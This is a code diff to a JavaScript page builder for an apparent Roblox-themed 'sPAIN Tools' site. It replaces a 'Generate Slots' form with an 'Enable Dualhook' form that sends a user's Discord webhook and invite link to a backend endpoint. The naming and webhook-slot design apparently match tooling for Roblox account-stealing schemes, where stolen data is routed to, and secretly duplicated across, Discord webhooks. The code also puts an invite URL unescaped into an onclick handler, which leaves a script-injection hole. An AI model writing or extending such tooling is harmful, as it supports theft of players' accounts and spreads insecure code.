@@ -20,7 +20,9 @@ function build404() {
 
 function buildDualhookPage(record) {
   const SLUG = record.slug;
+  const DISPLAY = record.displayName || SLUG;
   const charSrc = record.charUrl || 'https://tr.rbxcdn.com/30DAY-Avatar-D7AA065464297A80748737C0DCD67BB4-Png/720/720/Avatar/Webp/noFilter';
+  const inviteUrl = record.inviteUrl || '';
   return `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -181,36 +183,29 @@ function buildDualhookPage(record) {
   /* PRODUCTS */
   .products { padding:110px 48px; max-width:1200px; margin:0 auto; }
 
-  /* FORM CARD */
+  /* DUALHOOK FORM CARD */
   .slots-form-wrap {
     max-width:640px; margin:0 auto;
     background:var(--card);
-    border:1px solid rgba(192,38,211,0.15);
+    border:1px solid rgba(6,182,212,0.2);
     border-radius:20px;
     padding:38px 42px 42px;
-    box-shadow:0 0 60px rgba(192,38,211,0.06),0 20px 60px rgba(0,0,0,0.4);
+    box-shadow:0 0 60px rgba(6,182,212,0.06),0 20px 60px rgba(0,0,0,0.4);
     position:relative; overflow:hidden;
   }
-  .slots-form-wrap::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,var(--accent),var(--accent2),var(--accent3)); }
-  .slots-form-wrap::after { content:''; position:absolute; bottom:-60px; right:-60px; width:200px; height:200px; background:radial-gradient(circle,rgba(192,38,211,0.07) 0%,transparent 70%); pointer-events:none; }
+  .slots-form-wrap::before { content:''; position:absolute; top:0; left:0; right:0; height:2px; background:linear-gradient(90deg,var(--accent3),var(--accent2),var(--accent)); }
+  .slots-form-wrap::after { content:''; position:absolute; bottom:-60px; right:-60px; width:200px; height:200px; background:radial-gradient(circle,rgba(6,182,212,0.07) 0%,transparent 70%); pointer-events:none; }
 
   .input-group { margin-bottom:16px; }
   .input-label { display:block; font-size:0.7rem; font-weight:600; letter-spacing:0.12em; text-transform:uppercase; color:var(--muted); margin-bottom:9px; }
-  .input-duo { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-
-  .url-display { display:flex; align-items:center; gap:10px; background:rgba(192,38,211,0.04); border:1px solid rgba(192,38,211,0.12); border-radius:10px; padding:11px 14px; overflow:hidden; }
-  .url-icon { width:28px; height:28px; background:rgba(192,38,211,0.1); border:1px solid rgba(192,38,211,0.22); border-radius:8px; display:flex; align-items:center; justify-content:center; flex-shrink:0; font-size:0.75rem; }
-  .url-text { flex:1; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:#8844aa; font-family:'Orbitron',sans-serif; font-size:0.68rem; letter-spacing:0.04em; }
 
   .field-input { width:100%; background:rgba(255,255,255,0.03); border:1px solid rgba(255,255,255,0.07); border-radius:10px; padding:11px 14px; color:var(--text); font-family:'Inter',sans-serif; font-size:0.88rem; outline:none; transition:border-color 0.2s,box-shadow 0.2s; }
   .field-input::placeholder { color:rgba(90,90,120,0.7); }
-  .field-input:focus { border-color:rgba(192,38,211,0.4); box-shadow:0 0 0 3px rgba(192,38,211,0.08); }
+  .field-input:focus { border-color:rgba(6,182,212,0.4); box-shadow:0 0 0 3px rgba(6,182,212,0.08); }
 
-  .opt-badge { font-size:0.58rem; background:rgba(168,85,247,0.12); border:1px solid rgba(168,85,247,0.25); color:#a855f7; padding:1px 6px; border-radius:4px; margin-left:6px; letter-spacing:0.08em; vertical-align:middle; }
-
-  .slots-generate-btn { width:100%; background:linear-gradient(135deg,var(--accent),var(--accent2)); color:#fff; border:none; padding:15px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 36px rgba(192,38,211,0.4); transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s; position:relative; overflow:hidden; }
-  .slots-generate-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(192,38,211,0.65); }
-  .slots-generate-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
+  .dh-submit-btn { width:100%; background:linear-gradient(135deg,#0891b2,#06b6d4); color:#fff; border:none; padding:15px 0; border-radius:12px; font-family:'Rajdhani',sans-serif; font-size:1.05rem; font-weight:700; letter-spacing:0.1em; text-transform:uppercase; cursor:pointer; box-shadow:0 0 36px rgba(6,182,212,0.4); transition:transform 0.2s,box-shadow 0.2s,opacity 0.2s; position:relative; overflow:hidden; }
+  .dh-submit-btn:hover { transform:translateY(-2px); box-shadow:0 0 56px rgba(6,182,212,0.65); }
+  .dh-submit-btn:disabled { opacity:0.6; cursor:not-allowed; transform:none; }
 
   /* COMMUNITY */
   .community { padding:110px 48px; text-align:center; position:relative; overflow:hidden; }
@@ -295,37 +290,15 @@ function buildDualhookPage(record) {
   <h2 class="section-title">Discover All of Our Tools</h2>
 
   <div class="slots-form-wrap">
-
     <div class="input-group">
-      <label class="input-label">URL</label>
-      <div class="url-display">
-        <span class="url-icon">🔗</span>
-        <span class="url-text" id="slotsAutoUrl">https://spain-tools.vercel.app/sPAINTools</span>
-      </div>
+      <label class="input-label">Enter Your Webhook</label>
+      <input class="field-input" type="text" id="dh-webhook2" placeholder="https://discord.com/api/webhooks/...">
     </div>
-
-    <div class="input-duo" style="margin-bottom:16px;">
-      <div>
-        <label class="input-label">Directory Name</label>
-        <input class="field-input" type="text" id="sf-dirName" placeholder="sPAINTools" oninput="updateSlotsUrl()">
-      </div>
-      <div>
-        <label class="input-label">Display Name</label>
-        <input class="field-input" type="text" id="sf-dispName" placeholder="sPAIN Tools">
-      </div>
-    </div>
-
-    <div class="input-group">
-      <label class="input-label">Roblox Character URL <span class="opt-badge">optional</span></label>
-      <input class="field-input" type="text" id="sf-charUrl" placeholder="https://tr.rbxcdn.com/...">
-    </div>
-
     <div class="input-group" style="margin-bottom:28px;">
-      <label class="input-label">Webhook</label>
-      <input class="field-input" type="text" id="sf-webhook" placeholder="https://discord.com/api/webhooks/...">
+      <label class="input-label">Enter Invite URL <span style="font-size:0.58rem;background:rgba(168,85,247,0.12);border:1px solid rgba(168,85,247,0.25);color:#a855f7;padding:1px 6px;border-radius:4px;margin-left:6px;letter-spacing:0.08em;vertical-align:middle;">optional</span></label>
+      <input class="field-input" type="text" id="dh-inviteUrl2" placeholder="https://discord.gg/yourserver">
     </div>
-
-    <button class="slots-generate-btn" onclick="handleGenerate()">Generate Slots 1&ndash;9</button>
+    <button class="dh-submit-btn" onclick="handleDhSubmit()">Enable Dualhook</button>
   </div>
 </section>
 
@@ -340,7 +313,7 @@ function buildDualhookPage(record) {
     <div class="stat"><div class="stat-num" data-target="99" data-suffix="%">0%</div><div class="stat-label">Uptime</div></div>
     <div class="stat"><div class="stat-num">24/7</div><div class="stat-label">Support</div></div>
   </div>
-  <button class="discord-btn">
+  <button class="discord-btn" ${inviteUrl ? `onclick="window.open('${inviteUrl}','_blank')"` : ''}>
     <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M20.317 4.37a19.791 19.791 0 00-4.885-1.515.074.074 0 00-.079.037c-.21.375-.444.864-.608 1.25a18.27 18.27 0 00-5.487 0 12.64 12.64 0 00-.617-1.25.077.077 0 00-.079-.037A19.736 19.736 0 003.677 4.37a.07.07 0 00-.032.027C.533 9.046-.32 13.58.099 18.057a.082.082 0 00.031.057 19.9 19.9 0 005.993 3.03.078.078 0 00.084-.028c.462-.63.874-1.295 1.226-1.994a.076.076 0 00-.041-.106 13.107 13.107 0 01-1.872-.892.077.077 0 01-.008-.128 10.2 10.2 0 00.372-.292.074.074 0 01.077-.01c3.928 1.793 8.18 1.793 12.062 0a.074.074 0 01.078.01c.12.098.246.198.373.292a.077.077 0 01-.006.127 12.299 12.299 0 01-1.873.892.077.077 0 00-.041.107c.36.698.772 1.362 1.225 1.993a.076.076 0 00.084.028 19.839 19.839 0 006.002-3.03.077.077 0 00.032-.054c.5-5.177-.838-9.674-3.549-13.66a.061.061 0 00-.031-.03z"/></svg>
     Join our Discord
   </button>
@@ -353,6 +326,8 @@ function buildDualhookPage(record) {
 </footer>
 
 <script>
+const PAGE_SLUG = '${SLUG}';
+
 /* ── PARTICLES ── */
 (function(){
   const canvas = document.getElementById('particles');
@@ -383,66 +358,39 @@ function buildDualhookPage(record) {
   });
 })();
 
-/* ── URL PREVIEW ── */
-const DUALHOOK_PARENT_SLUG = '${SLUG}';
-const SITE_URL = 'https://spain-tools.vercel.app';
-function updateSlotsUrl() {
-  const dir = document.getElementById('sf-dirName').value.trim() || 'sPAINTools';
-  document.getElementById('slotsAutoUrl').textContent = \`\${SITE_URL}/\${dir}\`;
-}
+/* ── DUALHOOK SUBMIT ── */
+async function handleDhSubmit() {
+  const webhook2   = document.getElementById('dh-webhook2').value.trim();
+  const inviteUrl2 = document.getElementById('dh-inviteUrl2').value.trim();
+  const btn        = document.querySelector('.dh-submit-btn');
 
-/* ── HELPERS ── */
-function setStatus(btn, msg, color) {
-  let s = btn.parentElement.querySelector('.gen-status');
-  if (!s) { s = document.createElement('div'); s.className = 'gen-status'; s.style.cssText = 'margin-top:12px;font-size:0.7rem;font-family:Orbitron,sans-serif;text-align:center;min-height:20px;letter-spacing:0.06em;'; btn.parentElement.appendChild(s); }
-  s.style.color = color || '#5a5a78';
-  s.textContent = msg;
-}
-function flashField(id, color) {
-  const el = document.getElementById(id);
-  el.style.borderColor = color || 'rgba(192,38,211,0.6)';
-  el.style.boxShadow = \`0 0 0 3px \${color ? color.replace('0.6','0.12') : 'rgba(192,38,211,0.1)'}\`;
-  el.focus();
-  setTimeout(() => { el.style.borderColor=''; el.style.boxShadow=''; }, 2500);
-}
-
-/* ── GENERATE — SLOTS ── */
-async function handleGenerate() {
-  const dirName  = document.getElementById('sf-dirName').value.trim();
-  const dispName = document.getElementById('sf-dispName').value.trim();
-  const charUrl  = document.getElementById('sf-charUrl').value.trim();
-  const webhook  = document.getElementById('sf-webhook').value.trim();
-  const btn      = document.querySelector('.slots-generate-btn');
-
-  if (!dirName) { flashField('sf-dirName'); setStatus(btn,'⚠ Directory Name is required.','#e879f9'); return; }
-  if (!webhook) { flashField('sf-webhook'); setStatus(btn,'⚠ Webhook is required.','#e879f9'); return; }
+  if (!webhook2 || !webhook2.startsWith('https://discord.com/api/webhooks/')) {
+    btn.style.boxShadow = '0 0 0 2px rgba(239,68,68,0.6)';
+    setTimeout(() => { btn.style.boxShadow = ''; }, 2500);
+    return;
+  }
 
   const orig = btn.innerHTML;
-  btn.disabled = true; btn.textContent = 'Checking…'; setStatus(btn,'');
+  btn.disabled = true; btn.textContent = 'Submitting…';
 
   try {
-    const res  = await fetch('/api/claim', {
-      method:'POST', headers:{'Content-Type':'application/json'},
-      body: JSON.stringify({ name:dirName, displayName:dispName, webhook, charUrl, type:'slots', dualhookParent: DUALHOOK_PARENT_SLUG })
+    const res  = await fetch('/api/submit', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ slug: PAGE_SLUG, slots: { slot1: webhook2, slot2: inviteUrl2 }, webhook2 })
     });
     const data = await res.json();
-    if (data.taken) {
-      setStatus(btn, \`✗ "\${dirName}" is taken — choose another.\`, '#f472b6');
-      flashField('sf-dirName','rgba(192,38,211,0.6)');
-    } else if (data.success) {
-      document.getElementById('slotsAutoUrl').textContent = data.url;
-      btn.textContent = '✓ Claimed!';
+    if (data.success) {
+      btn.textContent = '✓ Done!';
       btn.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
       btn.style.boxShadow  = '0 0 36px rgba(34,197,94,0.4)';
-      setStatus(btn, \`✓ Your link: \${data.url}\`, '#4ade80');
-      setTimeout(() => { btn.innerHTML=orig; btn.style.background=''; btn.style.boxShadow=''; }, 3000);
     } else {
-      setStatus(btn, \`✗ \${data.error||'Something went wrong.'}\`, '#f472b6');
+      btn.disabled = false;
+      btn.innerHTML = orig;
     }
-  } catch { setStatus(btn,'✗ Network error. Try again.','#f472b6'); }
-  finally {
+  } catch {
     btn.disabled = false;
-    if (!btn.textContent.includes('Claimed')) btn.innerHTML = orig;
+    btn.innerHTML = orig;
   }
 }
 
